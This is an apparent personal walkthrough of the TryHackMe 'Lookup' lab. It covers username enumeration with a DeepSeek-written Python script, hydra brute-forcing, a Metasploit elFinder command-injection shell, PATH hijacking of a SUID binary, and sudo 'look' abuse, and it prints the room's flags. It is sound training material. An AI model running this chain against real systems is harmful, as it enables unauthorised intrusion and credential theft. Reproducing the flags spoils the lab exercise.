[THM](https://tryhackme.com/room/lookup)

nmap scan:
```
nmap -sV -O -T4 --min-rate=1000 $ip
```
output
```zsh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
```
login form at http
nothing in source code
tried some common credentials like “admin:admin” and “admin:password” doesn’t work, and SQLi attempts also fail.
tried enumerating subdomains and brute-forcing directories and files, but nothing came up.
tried a brute-force on “admin” , but nothing worked


gobuster:
```
gobuster dir -u http://$ip -w /usr/share/dirb/wordlists/common.txt -t 300 -x txt,php,html -q
```
output
```zsh
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/index.php            (Status: 302) [Size: 0] 
/index.php            (Status: 302) [Size: 0] 
/server-status        (Status: 403) [Size: 277]
```
nothing here too

observed the response
`user`=user
`pass`=pass
response:
```
Wrong username or password. Please try again.  
Redirecting in 3 seconds.
```
`user`=admin
`pass`=admin
response:
```
Wrong password. Please try again.  
Redirecting in 3 seconds.
```
so there is username called `admin`

went to deepseek give the following prompt:
```
Create a Python script that performs a username enumeration attack on a login form. The script should:

1. Target the URL "http://lookup.thm/login.php" using POST requests
2. Read usernames from the file "/usr/share/seclists/Usernames/Names/names.txt"
3. Use a fixed password "password" for all login attempts
4. Check the response content to distinguish between valid and invalid usernames:
   If response contains "Wrong password", print "Username found: [username]"
   If response contains "wrong username", silently continue to the next username
5. Include proper error handling for file not found and HTTP request exceptions
6. Use the requests library for HTTP operations
7. Strip whitespace from each username and skip empty lines
```
response
```python
import requests
import sys
from requests.exceptions import RequestException

def enumerate_usernames():
    # Target URL and file path
    url = "http://lookup.thm/login.php"
    username_file = "/usr/share/seclists/Usernames/Names/names.txt"
    password = "password"
    
    try:
        # Open and read the username file
        with open(username_file, 'r', encoding='utf-8', errors='ignore') as file:
            usernames = file.readlines()
        
        print(f"Testing {len(usernames)} usernames...", file=sys.stderr)
        
        # Iterate through each username
        for username in usernames:
            # Strip whitespace and skip empty lines
            username = username.strip()
            if not username:
                continue
            
            # Prepare the POST data
            data = {
                'username': username,
                'password': password
            }
            
            try:
                # Send POST request
                response = requests.post(url, data=data, timeout=10)
                
                # Check if the request was successful
                if response.status_code == 200:
                    response_text = response.text
                    
                    # Only print valid usernames (Wrong password response)
                    if "Wrong password" in response_text:
                        print(username)
                
            except RequestException:
                # Silently continue on request errors
                continue
                
    except FileNotFoundError:
        print(f"Error: Username file not found at {username_file}", file=sys.stderr)
        sys.exit(1)
    except IOError as e:
        print(f"Error reading file: {e}", file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(f"Unexpected error: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    enumerate_usernames()
```
saved it as a python file
executed
```
chmod +x usernamesenum.py
python3 usernamesenum.py
```
output
```zsh
Testing 10177 usernames...
admin
jose
```

 used hydra as to brute on `jose`
 ```
 hydra -l jose -P /usr/share/wordlists/rockyou.txt $ip http-post-form -f -W 5 -t 64 "/login.php:username=^USER^&password=^PASS^:Wrong password. Please try again"
 ```
 output
 ```zsh
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-10 03:14:01
[DATA] max 16 tasks per 1 server, overall 16 tasks, 262 login tries (l:1/p:262), ~17 tries per task
[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^:Wrong
[80][http-post-form] host: lookup.thm   login: jose   password: password123
[STATUS] attack finished for lookup.thm (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-10 03:14:14
 ```
 got the password as `password123`

upon logging in it goes to a sub domain` http://files.lookup.thm/`
 added to `/etc/hosts`
 saw many files
 downloaded the some and tried ssh with hydra- failed
 check the version of file manger
 saw that 
 ```
 ### elFinder
Web file manager
Version: 2.1.47
protocol version: 2.1047
jQuery/jQuery UI: 3.3.1/1.12.1
 ```
 search for exploits:
 ```
 searchsploit elFinder 2.1.47
 ```
 output
 ```zsh

elFinder 2.1.47 - 'PHP connector' Command Injection                                                                                                                                               | php/webapps/46481.py
elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Metasploit)                                                                                                                       | php/remote/46539.rb
elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Metasploit)                                                                                                                       | php/remote/46539.rb

 ```
 tried uploading python file it got failed to upload

used metasploit
```msf
msf > search elfinder
0  exploit/multi/http/builderengine_upload_exec
1  exploit/unix/webapp/tikiwiki_upload_exec
2  exploit/multi/http/wp_file_manager_rce
3  exploit/linux/http/elfinder_archive_cmd_injection
4  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
```
need a php connector so used 4
 ```msf
 msf > use 4
 msf > set RHOST files.lookup.thm
 msf > set LHOST 10.17.10.30
 msf > run
 ```
 got the meterpreter shell
```
meterpreter > shell
Process 5654 created.
Channel 0 created.
```

did the basic things
```
uname -a
cat /etc/os-release
whoami
```
output
```bash
Linux ip-10-10-20-241 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux

NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal

www-data
```
tried to read home directory
```
ls /home
```
there are 3 directories
ssm-user  think  ubuntu
```
cd think
ls -la
```
output
```bash
drwxr-xr-x 5 root  root  4096 Sep  9 20:33 ..
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .bash_history -> /dev/null
-rwxr-xr-x 1 think think  220 Jun  2  2023 .bash_logout
-rwxr-xr-x 1 think think 3771 Jun  2  2023 .bashrc
drwxr-xr-x 2 think think 4096 Jun 21  2023 .cache
drwx------ 3 think think 4096 Aug  9  2023 .gnupg
-rw-r----- 1 root  think  525 Jul 30  2023 .passwords
-rwxr-xr-x 1 think think  807 Jun  2  2023 .profile
drw-r----- 2 think think 4096 Jun 21  2023 .ssh
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .viminfo -> /dev/null
-rw-r----- 1 root  think   33 Jul 30  2023 user.txt
```
saw the `user.txt` and the` .passwords`

search for suid binaries
```
find / -perm /4000 2>/dev/null
```
output
```bash
/snap/snapd/19457/usr/lib/snapd/snap-confine
/snap/core20/1950/usr/bin/chfn
/snap/core20/1950/usr/bin/chsh
/snap/core20/1950/usr/bin/gpasswd
/snap/core20/1950/usr/bin/mount
/snap/core20/1950/usr/bin/newgrp
/snap/core20/1950/usr/bin/passwd
/snap/core20/1950/usr/bin/su
/snap/core20/1950/usr/bin/sudo
/snap/core20/1950/usr/bin/umount
/snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1950/usr/lib/openssh/ssh-keysign
/snap/core20/1974/usr/bin/chfn
/snap/core20/1974/usr/bin/chsh
/snap/core20/1974/usr/bin/gpasswd
/snap/core20/1974/usr/bin/mount
/snap/core20/1974/usr/bin/newgrp
/snap/core20/1974/usr/bin/passwd
/snap/core20/1974/usr/bin/su
/snap/core20/1974/usr/bin/sudo
/snap/core20/1974/usr/bin/umount
/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1974/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pwm
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
```
googled the results
- **`/usr/sbin/pwm` - This is not a standard Linux command (might be specific to hardware or a custom installation).**
```
ls -alps /usr/sbin/pwm
20 -rwsr-sr-x 1 root root 17176 Jan 11  2024 /usr/sbin/pwm
```
also owned by root
saw executable perms to others
tried to execute
```
 /usr/sbin/pwm
/usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```
 this binary seems to execute the “id” command, and then extracts the username out of it, and then puts that username into “/home/< username >/.passwords” and tries to do something with it

If the “id” command is not specified with it’s full path (/bin/id), it is found and executed via the PATH variable in our environment.
```
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
add /tmp to the $PATH
```
export PATH=/tmp:$PATH
bash-5.0$ echo $PATH
echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

created a file called id with these contents
```
#!/bin/bash
echo "uid=33(think) gid=33(think) groups=33(think)"
```
run pwm
```
/usr/sbin/pwm
```
output
```bash
/usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: THINK
jose1000
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0900
jose09865
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
jose'sbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
josemario.AKA(think)
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardol00
jose.leas.30
jose.ivan
jose.122
jose.hm
jose.hater
#etc......
```
put these and try brute forcing

used hydra
```
hydra -l think -P pass.txt lookup.thm ssh
```
output
```zsh
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-10 05:42:22
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 37 login tries (l:1/p:37), ~3 tries per task
[DATA] attacking ssh://lookup.thm:22/
[22][ssh] host: lookup.thm   login: think   password: josemario.AKA(think)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-10 05:42:34
```
got the password `josemario.AKA(think)`
login through ssh
```
think@ip-10-10-20-241:~$ ls
user.txt
think@ip-10-10-20-241:~$ cat user.txt
38375fb4dd8baa2b2039ac03d92b820e
```
user flag: `38375fb4dd8baa2b2039ac03d92b820e`

check sudo perms
```
sudo -l
```
output
```
Matching Defaults entries for think on ip-10-10-20-241:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on ip-10-10-20-241:
    (ALL) /usr/bin/look
```
look is allowed to use with sudo
```
sudo look '' /root/root.txt
5a285a9f257e45c68bb6c9f9f57d18e8
```
root flag =`5a285a9f257e45c68bb6c9f9f57d18e8